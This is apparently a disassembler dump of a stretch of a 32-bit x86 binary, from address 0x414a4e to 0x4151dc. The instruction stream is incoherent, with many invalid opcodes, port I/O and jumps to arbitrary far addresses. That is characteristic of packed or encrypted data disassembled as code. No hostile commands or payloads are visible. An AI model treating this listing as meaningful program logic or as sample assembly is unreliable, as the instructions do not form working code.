  414a4e:	fsubr  QWORD PTR [esi]
  414a50:	repz addr16 cld 
  414a53:	aad    0xd7
  414a55:	sbb    eax,0xac5270a3
  414a5a:	xor    BYTE PTR [ecx+0x531a06df],bl
  414a60:	mov    cl,0x82
  414a62:	mov    bl,bh
  414a64:	lods   eax,DWORD PTR ds:[esi]
  414a65:	or     bl,BYTE PTR [ecx+0x61]
  414a68:	xchg   edx,eax
  414a69:	jle    0x414a11
  414a6b:	jle    0x414a84
  414a6d:	call   0x20e5:0x1e3f3e4c
  414a74:	sbb    al,0x5e
  414a76:	mov    dl,0xf7
  414a78:	push   ds
  414a79:	cmp    ecx,edx
  414a7b:	out    0xac,al
  414a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a7e:	popf   
  414a7f:	and    eax,ecx
  414a81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a82:	push   edx
  414a83:	jnp    0x414ae4
  414a85:	xchg   edx,eax
  414a86:	popa   
  414a87:	popf   
  414a88:	cs pusha 
  414a8a:	and    DWORD PTR [ecx-0x4fd2d9a8],esp
  414a90:	mov    esp,0x6006783f
  414a95:	mov    eax,0x66084b54
  414a9a:	cmp    esp,DWORD PTR [esi+0x75c76b76]
  414aa0:	dec    ecx
  414aa1:	popa   
  414aa2:	adc    al,0x78
  414aa4:	imul   edi,DWORD PTR [edi+0x63f71c49],0x5e
  414aab:	xchg   ecx,eax
  414aac:	je     0x414a94
  414aae:	jae    0x414a96
  414ab0:	not    DWORD PTR [ecx-0x5c8ce613]
  414ab6:	add    DWORD PTR [eax],ecx
  414ab8:	dec    eax
  414ab9:	pop    es
  414aba:	call   0xe817:0xecf8234a
  414ac1:	data16 sar cl,cl
  414ac4:	xchg   esp,eax
  414ac5:	xchg   ecx,eax
  414ac6:	push   ebx
  414ac7:	inc    esi
  414ac8:	mov    ebp,0x2be2cf4a
  414acd:	dec    ebx
  414ace:	mov    edx,0x3fef746f
  414ad3:	mov    ah,0x77
  414ad5:	jp     0x414af0
  414ad7:	dec    esp
  414ad8:	dec    edi
  414ad9:	repz sbb al,0xf8
  414adc:	pusha  
  414add:	call   0x62820b54
  414ae2:	mov    ds:0x799119b7,al
  414ae7:	(bad)
  414aeb:	sub    BYTE PTR [eax],al
  414aed:	ret    
  414aee:	xor    DWORD PTR [ebx],ecx
  414af0:	pause  
  414af2:	iret   
  414af3:	mov    dh,0x54
  414af5:	mov    eax,ds:0x651f6ac
  414afa:	pop    edi
  414afb:	mov    bh,0xec
  414afd:	dec    ecx
  414afe:	adc    bl,bl
  414b00:	mov    eax,0xadc970a4
  414b05:	sub    dl,BYTE PTR cs:[ebx]
  414b08:	shr    DWORD PTR [edx],cl
  414b0a:	mov    WORD PTR ds:0x721ad6fc,gs
  414b10:	lock cmp ebx,0xffffff8e
  414b14:	or     eax,0xbff9ecd3
  414b19:	ror    BYTE PTR [edx+ecx*8],1
  414b1c:	mov    ah,0x5c
  414b1e:	loope  0x414af0
  414b20:	out    0x46,eax
  414b22:	cld    
  414b23:	or     al,0x50
  414b25:	mov    esi,0x86cc36b9
  414b2a:	rcr    DWORD PTR [ecx+0x36],cl
  414b2d:	jge    0x414afc
  414b2f:	inc    ecx
  414b30:	jmp    0x414ae5
  414b32:	xor    edx,DWORD PTR [esi]
  414b34:	(bad)  
  414b36:	sub    DWORD PTR [ebx-0x2d126503],edi
  414b3c:	xor    eax,0x439cf1a0
  414b42:	loope  0x414b47
  414b44:	lahf   
  414b45:	dec    esi
  414b46:	loop   0x414aea
  414b48:	ror    BYTE PTR [eax+0x33ff44b6],0xf
  414b4f:	inc    ebp
  414b50:	jae    0x414b2e
  414b52:	cmc    
  414b53:	stos   BYTE PTR es:[edi],al
  414b54:	out    0x2a,al
  414b56:	mov    ebx,0x82235210
  414b5b:	jne    0x414b0a
  414b5d:	sub    al,0xa5
  414b5f:	repz test eax,0xaa4ab890
  414b65:	lea    ebx,[edx+0x77]
  414b68:	jb     0x414b62
  414b6a:	(bad)  
  414b6b:	push   ebx
  414b6c:	stos   BYTE PTR es:[edi],al
  414b6d:	fwait
  414b6e:	push   ecx
  414b6f:	fld    TBYTE PTR [ebx]
  414b71:	out    dx,al
  414b72:	sub    DWORD PTR [esp+eax*4+0x209fb6b4],edx
  414b79:	das    
  414b7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b7b:	sahf   
  414b7c:	add    dh,BYTE PTR [esi+0x59]
  414b7f:	frstor [ebx+0x146deb37]
  414b85:	mov    edi,0x74e2d2c9
  414b8a:	xchg   ecx,eax
  414b8b:	sar    BYTE PTR [esi+0x484e6ad7],1
  414b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b92:	adc    bh,cl
  414b94:	ds aas 
  414b96:	xacquire xchg BYTE PTR [eax+0x12],bl
  414b9a:	inc    edx
  414b9b:	push   esp
  414b9c:	add    eax,0x3ab97cac
  414ba1:	mov    eax,0xf5a0939
  414ba6:	mov    DWORD PTR [ebx],ebp
  414ba8:	jmp    0x7851579e
  414bad:	pop    edx
  414bae:	aam    0xfd
  414bb0:	mov    ds:0x7b141d8c,eax
  414bb5:	loope  0x414b58
  414bb7:	inc    ebp
  414bb8:	data16 or bl,dl
  414bbb:	push   cs
  414bbc:	cmp    DWORD PTR [ebx-0xefe4f5f],edi
  414bc2:	fs ja  0x414b5a
  414bc5:	movlpd QWORD PTR [esi+0x71],xmm1
  414bca:	adc    ebp,DWORD PTR [ebp+0x6f992652]
  414bd0:	pop    ecx
  414bd1:	cmp    al,0xcd
  414bd3:	retf   0xa0a1
  414bd6:	jmp    0x414c0c
  414bd8:	xor    eax,0xd49beeac
  414bdd:	bound  edi,QWORD PTR [ebp-0x3ffb9fc0]
  414be3:	mov    ds:0x455a4ad2,eax
  414be8:	xor    BYTE PTR [ecx+0x1eadef09],0x8f
  414bef:	push   0xffffffd2
  414bf1:	stc    
  414bf2:	aam    0xcb
  414bf4:	mov    gs:0xbb142d28,al
  414bfa:	push   edi
  414bfb:	cmp    DWORD PTR [edi],0x338b5f4e
  414c01:	jp     0x414c50
  414c03:	ds cmp ecx,esi
  414c06:	sub    BYTE PTR [ecx-0x58501c90],dl
  414c0c:	stos   DWORD PTR es:[edi],eax
  414c0d:	fcmovne st,st(7)
  414c0f:	mov    edi,0xa3579309
  414c14:	shl    BYTE PTR [ebx+eiz*1+0x1a],0xe5
  414c19:	out    0xf2,eax
  414c1b:	add    esi,DWORD PTR [edx-0x63]
  414c1e:	fld    TBYTE PTR [edx]
  414c20:	push   eax
  414c21:	dec    eax
  414c22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c23:	sbb    edi,DWORD PTR [edi-0x45678b04]
  414c29:	(bad)  
  414c2a:	sbb    al,0x3a
  414c2c:	xor    eax,edi
  414c2e:	scas   al,BYTE PTR es:[edi]
  414c2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c30:	jno    0x414c18
  414c32:	mov    cl,0x8f
  414c34:	out    dx,eax
  414c35:	push   ss
  414c36:	sahf   
  414c37:	xor    DWORD PTR [ebx+esi*4+0x689e583e],0x2591b53c
  414c42:	fist   WORD PTR [eax+eiz*2+0x57]
  414c46:	sbb    dl,cl
  414c48:	adc    ah,BYTE PTR [edi]
  414c4a:	scas   al,BYTE PTR es:[edi]
  414c4b:	mov    ch,0x7f
  414c4d:	int    0xc5
  414c4f:	lahf   
  414c50:	adc    ah,BYTE PTR [ecx]
  414c52:	fs ins DWORD PTR es:[edi],dx
  414c54:	lods   al,BYTE PTR ds:[esi]
  414c55:	data16 mov al,0x65
  414c58:	inc    esi
  414c59:	rcl    DWORD PTR [ebx-0x2f],0x7f
  414c5d:	adc    bh,dh
  414c5f:	lock (bad) 
  414c61:	dec    esp
  414c62:	mov    bh,0x45
  414c64:	dec    eax
  414c65:	stos   DWORD PTR es:[edi],eax
  414c66:	jp     0x414c98
  414c68:	jae    0x414bfe
  414c6a:	sub    ebx,edi
  414c6c:	push   cs
  414c6d:	dec    esp
  414c6e:	jne    0x414c0b
  414c70:	or     al,0xeb
  414c72:	inc    eax
  414c73:	pushf  
  414c74:	jae    0x414cf0
  414c76:	add    DWORD PTR [ecx+0x4b69e5ad],eax
  414c7c:	jmp    0x414ca9
  414c7e:	cmc    
  414c7f:	pop    esi
  414c80:	xchg   ebp,eax
  414c81:	sub    eax,0x6f6a6212
  414c86:	dec    esp
  414c87:	scas   eax,DWORD PTR es:[edi]
  414c88:	push   ebx
  414c89:	adc    eax,0x44177d20
  414c8e:	mov    bh,0xc4
  414c90:	rcl    bl,1
  414c92:	(bad)  
  414c93:	(bad)  
  414c94:	dec    esp
  414c95:	out    0xac,eax
  414c97:	fcmovnbe st,st(4)
  414c99:	ins    BYTE PTR es:[edi],dx
  414c9a:	int3   
  414c9b:	adc    edi,DWORD PTR [esi+0x4d]
  414c9e:	pop    ds
  414c9f:	push   ebp
  414ca0:	xchg   ecx,eax
  414ca1:	neg    DWORD PTR [ebx]
  414ca3:	pop    esi
  414ca4:	jg     0x414c96
  414ca6:	fdecstp 
  414ca8:	cs pop esp
  414caa:	sub    dh,BYTE PTR [eax-0x5c]
  414cad:	dec    esp
  414cae:	sub    al,0xc9
  414cb1:	xor    bl,ch
  414cb3:	mov    WORD PTR [esi],fs
  414cb5:	cld    
  414cb6:	inc    ecx
  414cb7:	loope  0x414d32
  414cb9:	mov    ebp,0x8793e3ac
  414cbe:	iret   
  414cbf:	add    edi,edi
  414cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cc2:	aam    0xe2
  414cc4:	pop    edx
  414cc5:	mov    WORD PTR [eax+0x20],ds
  414cc8:	pop    eax
  414cc9:	sbb    al,0x2
  414ccb:	into   
  414ccc:	sbb    ebp,DWORD PTR [ebp+0x2d]
  414ccf:	push   edx
  414cd0:	cwde   
  414cd1:	push   eax
  414cd2:	icebp  
  414cd3:	sub    ecx,esp
  414cd5:	add    al,0x78
  414cd7:	jmp    0x414c79
  414cd9:	mov    esp,DWORD PTR [edx+0x31fbaba6]
  414cdf:	shr    BYTE PTR [ecx+0x7f],0x66
  414ce3:	pop    edi
  414ce4:	(bad)  
  414ce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ce6:	push   0xffffff85
  414ce8:	or     al,0xe8
  414cea:	pop    esi
  414ceb:	retf   0xd2eb
  414cee:	(bad)  
  414cef:	inc    eax
  414cf0:	jl     0x414c99
  414cf2:	jno    0x414c8b
  414cf4:	add    esp,eax
  414cf6:	sbb    eax,DWORD PTR [eax+0xd]
  414cf9:	push   edi
  414cfa:	rol    cl,0x5a
  414cfd:	mov    ecx,0x97a09974
  414d02:	push   ecx
  414d03:	push   ebx
  414d04:	rcr    BYTE PTR [esi],1
  414d06:	fs std 
  414d08:	push   ds
  414d09:	pop    ecx
  414d0a:	cmp    eax,0x2cdf87a7
  414d0f:	retf   0x5df0
  414d12:	mov    edi,0xd5fb460d
  414d17:	jmp    0x6113:0xeb8ec539
  414d1e:	in     al,0x3e
  414d20:	sub    dl,BYTE PTR [ebp-0x4a]
  414d23:	add    di,WORD PTR [eax]
  414d26:	mov    bl,0xba
  414d28:	sbb    eax,0x9358d36f
  414d2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d2e:	push   ebx
  414d2f:	cmp    ebx,edx
  414d31:	arpl   bp,dx
  414d33:	hlt    
  414d34:	enter  0x4cbf,0x68
  414d38:	popa   
  414d39:	push   ds
  414d3a:	pop    eax
  414d3b:	repnz ds mov esi,ebx
  414d3f:	fist   WORD PTR [ecx-0x66]
  414d42:	lea    esi,[esi-0x1c]
  414d45:	inc    edi
  414d46:	out    dx,eax
  414d47:	stc    
  414d48:	out    0xa2,eax
  414d4a:	add    DWORD PTR [edx+0x5669b86],eax
  414d50:	stc    
  414d51:	gs in  eax,0x7d
  414d54:	pop    esi
  414d55:	pop    ss
  414d56:	lahf   
  414d57:	sub    ebp,DWORD PTR [ebx-0x3b6c45c6]
  414d5d:	dec    ebx
  414d5e:	addps  xmm5,XMMWORD PTR [esi]
  414d61:	popf   
  414d62:	push   eax
  414d63:	lock (bad) 
  414d65:	sub    dl,dh
  414d67:	and    al,0x71
  414d69:	imul   esp,edi,0x5b
  414d6c:	addr16 in eax,0x5a
  414d6f:	jmp    0xf6eff36b
  414d74:	sub    BYTE PTR [ecx-0x46],al
  414d77:	shl    BYTE PTR [esi+0x53d105b7],1
  414d7d:	in     eax,dx
  414d7e:	in     eax,0x51
  414d80:	cmp    eax,0xecc88830
  414d85:	xchg   esp,eax
  414d86:	imul   ebx,esi,0xffffff93
  414d89:	mov    al,0xfc
  414d8b:	lea    esi,[edx+0x45]
  414d8e:	jle    0x414dc1
  414d90:	fwait
  414d91:	push   cs
  414d92:	imul   edx,DWORD PTR [esi+0x73dc5160],0xe
  414d99:	adc    WORD PTR [ebx+eiz*2+0x4ca6e141],bx
  414da1:	cli    
  414da2:	(bad)  [eax+esi*1+0x74]
  414da6:	cli    
  414da7:	xchg   esi,eax
  414da8:	cmp    BYTE PTR [ebp-0x15ab10a5],cl
  414dae:	fwait
  414daf:	mov    cl,0x40
  414db1:	pop    es
  414db2:	pop    edi
  414db3:	ja     0x414d5f
  414db5:	mov    ecx,0xe198d38d
  414dba:	cdq    
  414dbb:	(bad)  
  414dbc:	addr16 inc ebp
  414dbe:	push   ebx
  414dbf:	pop    eax
  414dc0:	adc    ebx,DWORD PTR [edx+0x793701f3]
  414dc6:	(bad)  
  414dc7:	data16 scas al,BYTE PTR es:[edi]
  414dc9:	xor    ecx,ebx
  414dcb:	push   eax
  414dcc:	stos   BYTE PTR es:[edi],al
  414dcd:	daa    
  414dce:	adc    dh,BYTE PTR [ebp+0x55]
  414dd1:	dec    esp
  414dd2:	jo     0x414dbe
  414dd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dd5:	xlat   BYTE PTR ds:[ebx]
  414dd6:	fwait
  414dd7:	aas    
  414dd8:	sbb    BYTE PTR [ebx+esi*4-0x44],dl
  414ddc:	mov    eax,ds:0xac8c69f9
  414de1:	clc    
  414de2:	lea    edx,[eax+0x3b9ec321]
  414de8:	fbstp  TBYTE PTR [edx]
  414dea:	cs xchg ecx,eax
  414dec:	lahf   
  414ded:	test   al,0x11
  414def:	and    ebp,DWORD PTR [edx*4+0x1dd422d5]
  414df6:	repz or esp,ebx
  414df9:	popa   
  414dfa:	jecxz  0x414d97
  414dfc:	and    DWORD PTR [esi],eax
  414dfe:	or     BYTE PTR [ecx],dh
  414e00:	pushf  
  414e01:	pop    ecx
  414e02:	sbb    al,0xa9
  414e04:	pop    edi
  414e05:	cld    
  414e06:	leave  
  414e07:	or     ch,BYTE PTR ds:0x8891df96
  414e0d:	xlat   BYTE PTR ds:[ebx]
  414e0e:	sbb    DWORD PTR [edi+0x14],ebp
  414e11:	js     0x414e12
  414e13:	push   eax
  414e14:	push   ecx
  414e15:	dec    edx
  414e16:	call   0xbb1b0ebf
  414e1b:	adc    al,dh
  414e1d:	fsin   
  414e1f:	xchg   edx,eax
  414e20:	rcr    BYTE PTR ds:0x1f301924,0x8
  414e27:	push   es
  414e28:	rol    DWORD PTR [edi+0xc],cl
  414e2b:	idiv   BYTE PTR [eax-0x42]
  414e2e:	mov    bh,0xe4
  414e30:	pop    es
  414e31:	jnp    0x414e55
  414e33:	stos   BYTE PTR es:[edi],al
  414e34:	adc    bl,BYTE PTR [ebx+eiz*2]
  414e37:	mov    ebp,0x1d63b492
  414e3c:	sub    DWORD PTR [ebx],edx
  414e3e:	dec    eax
  414e3f:	mov    ds:0x99fde03,al
  414e44:	shl    ah,cl
  414e46:	xlat   BYTE PTR ds:[ebx]
  414e47:	jne    0x414e94
  414e49:	xchg   edi,esp
  414e4b:	sbb    DWORD PTR [ecx+0x3613ce24],0x8f366d66
  414e55:	pop    ecx
  414e56:	out    0x29,al
  414e58:	xchg   esi,eax
  414e59:	outs   dx,DWORD PTR ds:[esi]
  414e5a:	call   0x8f6f:0x2e42f088
  414e61:	mov    al,0x25
  414e63:	retf   0x3410
  414e66:	jns    0x414e19
  414e68:	xor    eax,0xebcf2d2e
  414e6d:	sbb    DWORD PTR [ebx+0x5980129c],edi
  414e73:	inc    esi
  414e74:	(bad)  
  414e75:	mov    edx,0x969008a6
  414e7a:	push   edx
  414e7b:	jg     0x414e6a
  414e7d:	pop    esi
  414e7e:	and    BYTE PTR [eax+0x21],al
  414e81:	inc    esp
  414e82:	push   ebp
  414e83:	mov    ecx,0x7b7591c1
  414e88:	jo     0x414e4f
  414e8a:	and    ah,BYTE PTR [eax]
  414e8c:	pop    ebx
  414e8d:	sub    DWORD PTR [ebx+ebx*4],eax
  414e90:	adc    edx,0xfffffff6
  414e93:	imul   edi,DWORD PTR [ecx-0x74bca49f],0xf42e67c8
  414e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e9e:	(bad)  
  414ea0:	fs dec edi
  414ea2:	inc    esp
  414ea3:	pop    es
  414ea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ea5:	ja     0x414eea
  414ea7:	jl     0x414edb
  414ea9:	retf   
  414eaa:	push   0xa07b7e55
  414eaf:	jbe    0x414f13
  414eb1:	mov    ah,0xa8
  414eb3:	and    dl,cl
  414eb5:	lock outs dx,BYTE PTR ds:[esi]
  414eb7:	(bad)  
  414eb8:	jp     0x414ef2
  414eba:	xor    DWORD PTR [esi+0x152d5883],edi
  414ec0:	xchg   ebp,eax
  414ec1:	ja     0x414e60
  414ec3:	jl     0x414f22
  414ec5:	stos   DWORD PTR es:[edi],eax
  414ec6:	add    al,ah
  414ec8:	inc    esi
  414ec9:	sbb    al,0x38
  414ecb:	or     al,0x56
  414ecd:	stc    
  414ece:	jno    0x414ee7
  414ed0:	or     BYTE PTR [edi+0x1c],0x2b
  414ed4:	mov    bl,dl
  414ed6:	xor    BYTE PTR [eax],dl
  414ed8:	sub    bl,dh
  414eda:	push   ebp
  414edb:	xchg   ebp,eax
  414edc:	add    DWORD PTR [edx+esi*1+0xb8641a8],ebp
  414ee3:	mov    eax,ds:0x3ddf1feb
  414ee8:	or     cl,BYTE PTR [esi-0x549cfc5e]
  414eee:	mov    ds:0x68594fdf,eax
  414ef3:	jge    0x414f18
  414ef5:	mov    esp,0x38f3bebc
  414efa:	aad    0xa8
  414efc:	pop    es
  414efd:	pop    ecx
  414efe:	in     al,dx
  414eff:	(bad)  
  414f00:	pushf  
  414f01:	arpl   WORD PTR [ebx+0x50653fa7],sp
  414f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f08:	int    0x87
  414f0a:	test   al,0x94
  414f0c:	inc    edx
  414f0d:	test   esp,ebx
  414f0f:	aaa    
  414f10:	or     DWORD PTR [esi],edx
  414f12:	cmp    ebp,ebp
  414f14:	lahf   
  414f15:	ror    BYTE PTR [edi+0xf],1
  414f18:	push   0xddaf92d5
  414f1d:	jecxz  0x414eb1
  414f1f:	inc    ebp
  414f20:	sbb    al,0x96
  414f22:	test   al,0x1a
  414f24:	jmp    0x414f0d
  414f26:	test   DWORD PTR [ebx-0x17300741],edi
  414f2c:	dec    ebx
  414f2d:	ficom  WORD PTR [esi+0x4c]
  414f30:	cdq    
  414f31:	inc    ebx
  414f32:	xchg   edx,eax
  414f33:	pop    ebx
  414f34:	jge    0x414f03
  414f36:	add    ah,dl
  414f38:	pop    es
  414f39:	(bad)  
  414f3a:	xor    esi,DWORD PTR [edi+0x77d6b7e8]
  414f40:	pop    esp
  414f41:	stos   BYTE PTR es:[edi],al
  414f42:	in     al,dx
  414f43:	fwait
  414f44:	pop    ds
  414f45:	ss fucomi st,st(6)
  414f48:	inc    edi
  414f49:	jge    0x414f68
  414f4b:	rcl    BYTE PTR [ecx+edx*8+0x55],1
  414f4f:	jp     0x414fa6
  414f51:	push   eax
  414f52:	in     al,dx
  414f53:	leave  
  414f54:	daa    
  414f55:	sbb    DWORD PTR [ebx],esi
  414f57:	ror    DWORD PTR [ecx+0x71],cl
  414f5a:	cli    
  414f5b:	add    dl,BYTE PTR [edi+0xa7f11a9]
  414f61:	outs   dx,BYTE PTR ds:[esi]
  414f62:	dec    ebp
  414f63:	sub    eax,0x821bdc77
  414f68:	or     edx,DWORD PTR [esi-0x50]
  414f6b:	dec    edi
  414f6c:	jne    0x414f9e
  414f6e:	lea    edx,[eax-0x864b10b]
  414f74:	(bad)  
  414f76:	aaa    
  414f77:	dec    ebp
  414f78:	push   es
  414f79:	sub    BYTE PTR [esi],bh
  414f7b:	dec    ecx
  414f7c:	push   ebx
  414f7d:	fnstenv [ecx-0x5f556f97]
  414f83:	jmp    0x77d89b3c
  414f88:	pusha  
  414f89:	(bad)
  414f8d:	call   0x4996241a
  414f92:	popa   
  414f93:	sub    BYTE PTR [ebx-0x3338babc],dh
  414f99:	dec    ebp
  414f9a:	leave  
  414f9b:	jl     0x414f24
  414f9d:	lahf   
  414f9e:	pop    es
  414f9f:	in     eax,0x76
  414fa1:	frstor ds:0xb90dda8a
  414fa7:	sbb    eax,0x4c3fb394
  414fac:	ret    0xc7a4
  414faf:	adc    DWORD PTR ds:0x605b6091,0xffffff83
  414fb6:	mov    esp,0x91c5c13b
  414fbb:	int    0x80
  414fbd:	(bad)  
  414fbe:	mov    al,0xd3
  414fc0:	in     eax,dx
  414fc1:	(bad)  
  414fc2:	out    0x7b,eax
  414fc4:	mov    ds,WORD PTR [edx]
  414fc6:	add    eax,0x8aa5a109
  414fcb:	adc    eax,0xf346158
  414fd0:	into   
  414fd1:	fbstp  TBYTE PTR [ebx+0x7c]
  414fd4:	daa    
  414fd5:	mov    DWORD PTR [ebx-0x2acf98fb],eax
  414fdb:	gs mov ecx,0xd83a1bf1
  414fe1:	neg    DWORD PTR [edx+ecx*1]
  414fe4:	stc    
  414fe5:	jl     0x415052
  414fe7:	sbb    esp,DWORD PTR [eax+0x31]
  414fea:	or     DWORD PTR [esp+esi*1+0x167daf52],edx
  414ff1:	mov    al,ds:0xd8cf2a00
  414ff6:	push   ebp
  414ff7:	xchg   DWORD PTR ds:0xe1ce0b99,eax
  414ffd:	cli    
  414ffe:	loopne 0x414f82
  415000:	(bad)  
  415002:	cmp    eax,0xeea370ae
  415007:	and    DWORD PTR ss:[ebx+ebp*8+0x1f],0xffffffbf
  41500d:	inc    eax
  41500e:	cli    
  41500f:	dec    esp
  415010:	push   ecx
  415011:	(bad)  
  415012:	inc    DWORD PTR [ecx+0x6]
  415015:	(bad)  
  415016:	push   ebx
  415017:	or     ebx,DWORD PTR [esp+esi*4+0x46a4d13e]
  41501e:	push   ds
  41501f:	sub    ah,BYTE PTR [edi+0x444563b1]
  415025:	pop    esp
  415026:	test   DWORD PTR [ecx-0x3f],0xbeff1133
  41502d:	push   0xffffff97
  41502f:	mov    ch,0xb4
  415031:	pop    ecx
  415032:	pop    ebx
  415033:	inc    ebp
  415034:	stos   BYTE PTR es:[edi],al
  415035:	test   DWORD PTR [ebx+0x5e39e679],0x7a0f1bea
  41503f:	(bad)  
  415040:	ror    BYTE PTR [edi+0x2b],cl
  415043:	xor    BYTE PTR [esi],dl
  415045:	jbe    0x414fd9
  415047:	mov    ah,0x3f
  415049:	mov    ah,0x13
  41504b:	pop    edx
  41504c:	sub    BYTE PTR [ebp-0x53],ch
  41504f:	jns    0x415078
  415051:	enter  0xce3b,0x34
  415055:	pusha  
  415056:	mov    edi,0xf35d8d59
  41505b:	xchg   edi,eax
  41505c:	pop    ebx
  41505d:	or     al,0x6a
  41505f:	(bad)  
  415061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415062:	cli    
  415063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415064:	mov    ch,cl
  415066:	inc    edx
  415067:	repnz add al,0x45
  41506a:	adc    eax,0x58cb5889
  41506f:	cmp    DWORD PTR [ebx+0x48],edx
  415072:	unpcklps xmm3,XMMWORD PTR [ebx+0xd]
  415076:	or     eax,0x5ccd5447
  41507b:	retf   
  41507c:	call   0x52f6:0x5e5bd2ee
  415083:	pop    ebx
  415084:	dec    ebx
  415085:	dec    ebp
  415086:	dec    ebp
  415087:	in     al,dx
  415088:	jecxz  0x41502d
  41508a:	mov    bh,0xed
  41508c:	inc    ebx
  41508d:	sbb    ch,dl
  41508f:	nop
  415090:	mov    DWORD PTR [edi],ecx
  415092:	popf   
  415093:	add    al,0x14
  415095:	jb     0x4150b4
  415097:	cmp    ebp,DWORD PTR [edi-0x919800e]
  41509d:	in     eax,0x3
  41509f:	cdq    
  4150a0:	sub    al,0x96
  4150a2:	in     eax,dx
  4150a3:	mov    edx,0xcc5a305c
  4150a8:	aas    
  4150a9:	in     al,dx
  4150aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150ab:	push   esp
  4150ac:	cld    
  4150ad:	leave  
  4150ae:	lock or al,0xd
  4150b1:	sbb    DWORD PTR [ecx-0x7e],esp
  4150b4:	shl    esp,0xac
  4150b7:	jo     0x4150d8
  4150b9:	cmp    cl,BYTE PTR [eax+0x790f1be9]
  4150bf:	adc    BYTE PTR [ecx+0x14afcac4],ah
  4150c5:	jae    0x41509f
  4150c7:	xor    al,0xa7
  4150c9:	int    0x76
  4150cb:	inc    ebx
  4150cc:	(bad)  
  4150cd:	(bad)  
  4150ce:	jge    0x4150c1
  4150d0:	fisub  DWORD PTR [eax]
  4150d2:	and    DWORD PTR [eax],ebx
  4150d4:	call   FWORD PTR [eax]
  4150d6:	cmp    al,0x2f
  4150d8:	jecxz  0x415084
  4150da:	jae    0x415083
  4150dc:	and    DWORD PTR [ecx-0x6e],eax
  4150df:	mov    ebp,0x733177c3
  4150e4:	jp     0x41511a
  4150e6:	cmc    
  4150e7:	sub    eax,0xab36ec21
  4150ec:	out    dx,eax
  4150ed:	ins    DWORD PTR es:[edi],dx
  4150ee:	pop    edx
  4150ef:	sub    DWORD PTR [ecx-0x2],esi
  4150f2:	neg    BYTE PTR [ebx]
  4150f4:	and    ebp,DWORD PTR [ecx+0x5d96c908]
  4150fa:	je     0x4150ae
  4150fc:	jecxz  0x41509d
  4150fe:	js     0x4150fc
  415100:	loopne 0x41510f
  415102:	scas   al,BYTE PTR es:[edi]
  415103:	out    dx,eax
  415104:	xchg   edx,eax
  415105:	je     0x415134
  415107:	cmp    eax,DWORD PTR [ecx+edx*4+0x30ec72f8]
  41510e:	(bad)  
  415110:	rcr    DWORD PTR [ebp+esi*4-0x367f3df9],1
  415117:	popa   
  415118:	ds rcr ebx,cl
  41511b:	mov    eax,ds:0x83b38a79
  415120:	push   esi
  415121:	sbb    ecx,DWORD PTR [ebx+0x5]
  415124:	in     al,dx
  415125:	cmc    
  415126:	cmc    
  415127:	das    
  415128:	and    eax,0x534c6f6a
  41512d:	ins    BYTE PTR es:[edi],dx
  41512e:	into   
  41512f:	push   edi
  415130:	push   ss
  415131:	in     al,0xb0
  415133:	xchg   edx,eax
  415134:	or     BYTE PTR [edx-0x60],ch
  415137:	nop
  415138:	or     edi,DWORD PTR [edi+0xe3f7707]
  41513e:	mov    ah,0x19
  415140:	cmc    
  415141:	jb     0x415100
  415143:	jo     0x41516e
  415145:	sub    ebx,0xffffff93
  415148:	sbb    al,0x1e
  41514a:	xchg   ebx,eax
  41514b:	adc    DWORD PTR [ecx],eax
  41514d:	sahf   
  41514e:	mov    bh,0x4
  415150:	or     eax,0x1e13c5d7
  415155:	pop    esi
  415156:	lds    esi,FWORD PTR [eax-0x235b08f3]
  41515c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41515d:	arpl   WORD PTR [edi-0x80],si
  415160:	lock lahf 
  415162:	out    0x86,eax
  415164:	and    ch,BYTE PTR [esi+0x44]
  415167:	mov    dh,0x13
  415169:	sbb    eax,0xf389ccec
  41516e:	mov    bh,0x10
  415170:	dec    BYTE PTR [edi-0x228bcd0d]
  415176:	pop    ebp
  415177:	clc    
  415178:	mov    edx,0xc8380ed9
  41517d:	imul   ebx,DWORD PTR [edi+0x6f],0x3e
  415181:	retf   0xafc9
  415184:	add    ah,BYTE PTR ds:[ebx]
  415187:	shl    DWORD PTR [esi],1
  415189:	mov    ah,0x43
  41518b:	bound  edi,QWORD PTR [ebx-0x1a49d974]
  415191:	loop   0x415180
  415193:	push   esp
  415194:	mov    eax,0x7b351f21
  415199:	push   eax
  41519a:	stos   BYTE PTR es:[edi],al
  41519b:	cdq    
  41519c:	iret   
  41519d:	sar    BYTE PTR [eax+0x6d],1
  4151a0:	mov    edi,DWORD PTR [ebx]
  4151a2:	cmp    ebx,ebx
  4151a4:	lods   eax,DWORD PTR ds:[esi]
  4151a5:	int3   
  4151a6:	jmp    0x415173
  4151a8:	xor    eax,edx
  4151aa:	pop    ss
  4151ab:	push   ecx
  4151ac:	add    DWORD PTR [edi-0x2304539f],0x373f7055
  4151b6:	daa    
  4151b7:	adc    BYTE PTR [esi],al
  4151b9:	lahf   
  4151ba:	dec    esp
  4151bb:	js     0x4151ce
  4151bd:	cdq    
  4151be:	rcl    BYTE PTR [ecx],1
  4151c0:	mov    ds:0x576b4dd0,eax
  4151c5:	push   ebp
  4151c6:	xchg   ebp,eax
  4151c7:	xor    DWORD PTR [ecx-0x61961edd],ebp
  4151cd:	jg     0x415176
  4151cf:	dec    ecx
  4151d0:	jbe    0x41521d
  4151d2:	stos   BYTE PTR es:[edi],al
  4151d3:	scas   al,BYTE PTR es:[edi]
  4151d4:	mov    cl,0xc1
  4151d6:	pop    ebp
  4151d7:	push   cs
  4151d8:	mov    bl,0xb9
  4151da:	popa   
  4151db:	push   edx
  4151dc:	xor    al,0xf7
